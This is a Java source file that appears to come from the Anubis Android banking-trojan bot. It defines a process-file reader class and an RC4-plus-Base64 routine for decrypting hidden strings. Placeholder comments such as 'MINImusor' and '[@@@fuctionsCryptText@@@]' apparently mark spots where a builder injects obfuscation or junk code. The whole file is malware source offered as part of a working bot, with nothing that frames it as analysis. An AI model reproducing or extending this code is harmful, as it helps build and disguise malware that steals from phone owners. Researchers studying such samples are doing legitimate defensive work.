package anubis.bot.myapplication.API.ProcessesSDK6;

import android.os.Parcel;
import android.os.Parcelable;
import android.util.Base64;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class classProcFile extends File implements Parcelable {
  UtilsClass SF = new UtilsClass();
  //MINImusor2
  //[@@@fuctionsCryptText@@@]
  //MINImusor1

  public String str_decrypt(String textDE_C, String key)
  {
    UtilsClass utilsClass = new UtilsClass();
    try
    {
      byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
      textDE_C = new String(data, "UTF-8");
      byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
      ClassRC4 rcd = new ClassRC4(key.getBytes());
      return  new String(rcd.decrypt(detext));
    }catch (Exception ex){ }
    return "";
  }


  static String readFile(String path) throws IOException {
    BufferedReader reader = null;
    try {
      StringBuilder output = new StringBuilder();
      reader = new BufferedReader(new FileReader(path));
      for (String line = reader.readLine(), newLine = ""; line != null; line = reader.readLine()) {
        output.append(newLine).append(line);
        newLine = Character.toString('\n');
      }
      return output.toString();
    } finally {
      if (reader != null) {
        try {
          reader.close();
        } catch (IOException ignored) {
        }
      }
    }
  }
  public final String content;

  protected classProcFile(String path) throws IOException {
    super(path);
    content = readFile(path);
  }
  //VVmusor1
  protected classProcFile(Parcel in) {
    super(in.readString());
    this.content = in.readString();
  }
  //MINImusor4
  @Override
  public long length() {
    return content.length();
  }

  @Override
  public int describeContents() {
    return 0;
  }

  @Override
  public void writeToParcel(Parcel dest, int flags) {
    dest.writeString(getAbsolutePath());
    dest.writeString(this.content);

  }

  public static final Creator<classProcFile> CREATOR = new Creator<classProcFile>() {

    @Override
    public classProcFile createFromParcel(Parcel in) {
      return new classProcFile(in);
    }

    @Override
    public classProcFile[] newArray(int TTR) {
      return new classProcFile[TTR];
    }
  };
}